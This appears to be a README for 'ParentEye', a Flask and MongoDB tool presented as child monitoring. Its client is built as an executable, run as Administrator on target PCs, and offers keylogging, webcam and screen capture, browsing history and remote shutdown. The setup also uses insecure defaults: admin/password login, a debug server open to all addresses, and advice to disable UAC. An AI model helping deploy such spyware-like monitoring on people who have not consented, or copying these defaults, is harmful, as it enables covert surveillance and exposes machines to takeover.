# ParentEye - Child Monitoring System

## 🎯 What is ParentEye?

ParentEye is a comprehensive child monitoring system that allows parents to:
- **Monitor** multiple child devices from a web dashboard
- **Control** websites, applications, and screen time
- **Track** keystrokes, browser history, and device location
- **Manage** app usage and set time-based restrictions
- **Respond** with alerts and notifications

---

## 📚 Documentation Guide

**Choose your scenario:**

| Scenario | Guide |
|----------|-------|
| 🏠 **Local Network Monitoring** | [QUICK_START_COMPLETE.md](QUICK_START_COMPLETE.md) |
| 🌍 **Remote/Cloud Deployment** | [REMOTE_DEPLOYMENT.md](REMOTE_DEPLOYMENT.md) |
| 📋 **Full Setup Instructions** | [DEPLOYMENT_GUIDE.md](DEPLOYMENT_GUIDE.md) |
| ⚙️ **Run Setup Wizard** | `setup_wizard.bat` |

---

## 🚀 Quick Start

### For Local Network (Home):
```bash
# 1. Configure backend
python config_client.py --wizard

# 2. Run backend
python backend.py

# 3. Access dashboard
http://localhost:5000
```

### For Remote Access (Cloud):
```bash
# 1. Edit .env with backend server URL
# BACKEND_URL=http://your-server.com:5000

# 2. Build the executable
build_exe.bat

# 3. Run on child PCs
# dist/ParentEye_Client.exe (as Administrator)

# 4. Parents access dashboard from anywhere
http://your-server.com:5000
```

---

## Overview
This system has been converted from a **Telegram chatbot** to a **web-based dashboard** with **MongoDB database**. Now you can:
- Control child's device from a **website dashboard**
- Store all data in **MongoDB** (cloud-hosted)
- View screenshots, keystrokes, and browsing history
- Execute commands remotely
- Deploy as executable to multiple child PCs

---

## Architecture

```
PARENT COMPUTER                    INTERNET                    CHILD COMPUTER
┌──────────────────┐              ┌──────────┐               ┌──────────────────┐
│  Web Browser     │ ←─────HTTP──→│  Server  │ ←─────HTTP──→│  Client Script   │
│  Dashboard       │              │ (Flask)  │              │ (Python or EXE)  │
│  (Port 5000)     │              │          │              │                  │
└──────────────────┘              └────┬─────┘              └──────────────────┘
                                       │
                                       ↓
                                  ┌──────────────────┐
                                  │   MongoDB Atlas  │
                                  │   (Cloud)        │
                                  │                  │
                                  │ - devices        │
                                  │ - commands       │
                                  │ - results        │
                                  │ - screenshots    │
                                  │ - keystrokes     │
                                  └──────────────────┘
```

---

## 🛠️ Deployment Tools

### Quick Setup:
```bash
# Interactive setup wizard (recommended)
setup_wizard.bat

# Or run individual tools:
python config_client.py --wizard    # Configure backend URL
python test_connection.py            # Test backend accessibility
build_exe.bat                         # Build executable for distribution
```

### Tools Available:
| Tool | Purpose | Usage |
|------|---------|-------|
| `config_client.py` | Configure client for remote backend | `python config_client.py --wizard` |
| `test_connection.py` | Test if backend is reachable | `python test_connection.py` |
| `build_exe.bat` | Build ParentEye_Client.exe | `build_exe.bat` |
| `setup_wizard.bat` | Guided setup interface | `setup_wizard.bat` |

---

## 📋 Installation & Setup

### Prerequisites
- Python 3.8+
- PyInstaller (for building exe): `pip install pyinstaller`
- Dependencies: Install from requirements.txt

### Step 1: Install Dependencies

```bash
pip install -r requirements.txt
```

If you get errors, install individually:
```bash
pip install flask pymongo requests psutil pyautogui opencv-python mss numpy imageio imageio-ffmpeg pynput pillow python-dotenv
```

### Step 2: Configure the System

**Option 1: Interactive Setup (Recommended)**
```bash
python config_client.py --wizard

# This creates/updates .env with:
# - BACKEND_URL (where to connect)
# - MONGODB_URI (database connection)
# - DB_NAME (database name)
```

**Option 2: Manual .env Configuration**
```
Edit .env file:

# For local testing:
BACKEND_URL=http://localhost:5000

# For remote server (cloud or home PC):
BACKEND_URL=http://your-server.com:5000
# or
BACKEND_URL=http://192.168.1.100:5000

# Database (MongoDB Atlas - already configured)
MONGODB_URI=mongodb+srv://...
```

### Step 3: Verify Backend Connection

```bash
# Test that backend is accessible
python test_connection.py

# Output should show: ✅ Backend is REACHABLE
```

---

## How to Run

### Option 1: Local Testing (Developer Mode)

```bash
# Terminal 1: Start Flask Backend
python backend.py
# Server will be available at: http://localhost:5000

# Terminal 2: Start Client (on same PC or different PC)
python client.py
# Client will connect to backend and register device
```

Then access dashboard at: **http://localhost:5000**
- Login: admin / password
- Select a device
- Use the 6 tabs to monitor and control

### Option 2: Build and Deploy as EXE

```bash
# 1. Update .env with your backend server URL
# Edit .env: BACKEND_URL=http://your-server.com:5000

# 2. Build executable
build_exe.bat
# Output: dist/ParentEye_Client.exe

# 3. Copy to child PCs (along with .env)
# dist/ParentEye_Client.exe
# .env

# 4. Run on child PC (requires Administrator)
# Right-click → Run as Administrator

# 5. Parents access dashboard from browser
# http://your-server.com:5000
```

---

## 🔧 Configuration Options

### MongoDB Backends (in .env)

**Local MongoDB:**
```
MONGODB_URI=mongodb://localhost:27017/
```
Good for: Testing locally

**MongoDB Atlas (Cloud):**
```
MONGODB_URI=mongodb+srv://username:password@cluster.mongodb.net/?retryWrites=true
```
Good for: Production, accessible globally

### Backend Server Options (in .env)

**Localhost (Local Testing):**
```
BACKEND_URL=http://localhost:5000
```
Good for: Development

**Local Network (Home/Office):**
```
BACKEND_URL=http://192.168.1.100:5000
```
Good for: Monitoring devices on same network

**Cloud Server (Anywhere):**
```
BACKEND_URL=http://your-domain.com:5000
BACKEND_URL=http://45.33.123.45:5000  # IP address
BACKEND_URL=https://secure.domain.com  # HTTPS
```
Good for: Global access, remote monitoring

### Terminal 3: Start Client (on child's computer)
```bash
cd c:\path\to\techshurujan_2026
python client.py
```

### Terminal 4: Open Dashboard
```
Open browser → http://localhost:5000
```

---

## How Website Controls Files/System

### 1. **Command Flow:**
```
Click Button on Website
         ↓
Flask receives HTTP request
         ↓
Command stored in MongoDB with status="pending"
         ↓
Client polls MongoDB every 5 seconds
         ↓
Client finds pending command
         ↓
Client executes command (lock, screenshot, etc)
         ↓
Result stored in MongoDB
         ↓
Website displays result to parent
```

### 2. **Example: Take Screenshot**

**Website (JavaScript):**
```javascript
fetch('/api/command/screenshot', {
    method: 'POST',
    body: JSON.stringify({ device_id: 'CHILD-PC-NAME' })
})
```

**Flask Backend (Python):**
```python
@app.route('/api/command/screenshot', methods=['POST'])
def cmd_screenshot():
    screenshot = pyautogui.screenshot()
    # Convert to base64
    img_base64 = convert_to_base64(screenshot)
    # Store in MongoDB
    screenshots_col.insert_one({
        "device_id": device_id,
        "image_base64": img_base64,
        "created_at": datetime.now()
    })
    return {"image": img_base64}
```

**Client (Python):**
```python
def check_pending_commands():
    # Get commands from backend
    response = requests.get(f"/api/commands/pending/{device_id}")
    commands = response.json()
    
    for cmd in commands:
        if cmd['command'] == 'screenshot':
            # Backend already takes screenshot
            # Just mark as executed
            mark_command_executed(cmd['_id'])
```

### 3. **What Gets Stored in MongoDB:**

```javascript
// devices collection
{
  "_id": ObjectId(...),
  "device_id": "DESKTOP-ABC123",
  "device_name": "John's Laptop",
  "status": "online",
  "pc_info": {
    "system": "Windows 10",
    "cpu_usage": 15.2,
    "ram_used": 4096,
    "ip_address": "192.168.1.100"
  }
}

// commands collection
{
  "_id": ObjectId(...),
  "device_id": "DESKTOP-ABC123",
  "command": "screenshot",
  "status": "pending",
  "created_at": ISODate(...),
  "executed": false
}

// results collection
{
  "_id": ObjectId(...),
  "device_id": "DESKTOP-ABC123",
  "command_id": ObjectId(...),
  "result": "Screenshot captured",
  "success": true,
  "created_at": ISODate(...)
}

// screenshots collection
{
  "_id": ObjectId(...),
  "device_id": "DESKTOP-ABC123",
  "image_base64": "iVBORw0KGgoAAAANS...",
  "created_at": ISODate(...)
}

// keystrokes collection
{
  "_id": ObjectId(...),
  "device_id": "DESKTOP-ABC123",
  "text": "hello world",
  "created_at": ISODate(...)
}
```

---

## Available Commands

### System Info
- **PC Info** - Get CPU, RAM, Disk, IP address
- **Screenshot** - Capture screen
- **Webcam** - Capture from webcam
- **Record Screen** - Video record (specify duration)
- **Chrome History** - Get last 20 visited websites

### Control Commands
- **Lock PC** - Lock the screen
- **Logout** - Log out current user
- **Restart** - Restart computer
- **Shutdown** - Turn off computer

### Monitoring
- **Start Keylogger** - Log all keystrokes
- **Stop Keylogger** - Stop logging

---

## For Remote Control (Important)

### If you want to control from another computer:

**On Server (Your Computer):**
1. Find your IP address:
   ```bash
   ipconfig
   ```
   Look for "IPv4 Address" (e.g., 192.168.1.5)

2. Edit `backend.py`:
   ```python
   if __name__ == '__main__':
       app.run(debug=True, host='0.0.0.0', port=5000)  # Allow all IPs
   ```

3. Edit `client.py`:
   ```python
   BACKEND_URL = "http://192.168.1.5:5000"  # Your IP
   ```

4. Install client script on child's computer
5. Open browser on your computer: `http://192.168.1.5:5000`

---

## Database Queries (for MongoDB)

```javascript
// View all devices
db.devices.find()

// View pending commands
db.commands.find({ "executed": false })

// View recent screenshots
db.screenshots.find().sort({ "created_at": -1 }).limit(5)

// View keystroke logs for a device
db.keystrokes.find({ "device_id": "DESKTOP-ABC123" })

// View command results
db.results.find({ "device_id": "DESKTOP-ABC123" }).sort({ "created_at": -1 })

// Delete old data (older than 7 days)
db.screenshots.deleteMany({ "created_at": { $lt: new Date(Date.now() - 7*24*60*60*1000) } })
```

---

## Troubleshooting

### 1. **Client shows "Connection refused"**
- Make sure Flask server is running
- Check if `BACKEND_URL` is correct
- Check firewall settings

### 2. **MongoDB connection error**
- Make sure MongoDB is running: `mongod`
- Or use MongoDB Atlas cloud version
- Check `MONGO_URI` in both files

### 3. **Website not loading**
- Flask should be on http://localhost:5000
- Check if port 5000 is not used by another app
- Try different port: `app.run(port=5001)`

### 4. **Screenshots/Keystrokes not appearing**
- Client might not be running
- Check client terminal for errors
- Make sure device is registered

### 5. **Permission denied errors**
- Run Python as Administrator
- Or disable UAC (User Account Control)

---

## Security Tips

⚠️ **WARNING: This is a powerful monitoring tool!**

1. **Secure MongoDB** - Add authentication if accessible remotely
2. **Use HTTPS** - For production, use SSL certificates
3. **Change Flask Secret Key** - Add: `app.config['SECRET_KEY'] = 'your-secret-key'`
4. **Firewall** - Block port 5000 from public internet
5. **Encryption** - Add password protection to dashboard

Example with authentication:
```python
from flask import session, request
from functools import wraps

@app.before_request
def check_auth():
    if request.path == '/login':
        return
    if 'user_id' not in session:
        return redirect('/login')
```

---

## Convert Back to Telegram (Optional)

If you want to keep both systems working, you can:
```python
# Send result to Telegram AND store in MongoDB
import requests

url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
payload = {"chat_id": CHAT_ID, "text": result}
requests.post(url, data=payload)

# Also store in MongoDB
results_col.insert_one(result_doc)
```

---

## File Structure

```
techshurujan_2026/
├── backend.py              # Flask server
├── client.py               # Client script (install on child PC)
├── templates/
│   └── index.html          # Web dashboard
├── requirements.txt        # Python packages
└── README.md              # This file
```

---

## Next Steps

1. ✅ Install MongoDB
2. ✅ Install Python packages
3. ✅ Run backend server
4. ✅ Run client on target device
5. ✅ Open website dashboard
6. ✅ Click device to start monitoring

---

## Support & Customization

To add more commands:

1. **Add endpoint in `backend.py`:**
```python
@app.route('/api/command/newcommand', methods=['POST'])
def cmd_newcommand():
    # Your code here
    return jsonify({"status": "success"})
```

2. **Add button in `index.html`:**
```html
<button class="btn-primary" onclick="executeCommand('newcommand')">New Command</button>
```

3. **Add execution in `client.py`:**
```python
elif command_type == "newcommand":
    # Execute your command
    pass
```

---

**Created: 2026-02-01**  
**System: Child Monitoring with Web Dashboard & MongoDB**
"# ParentEye" 
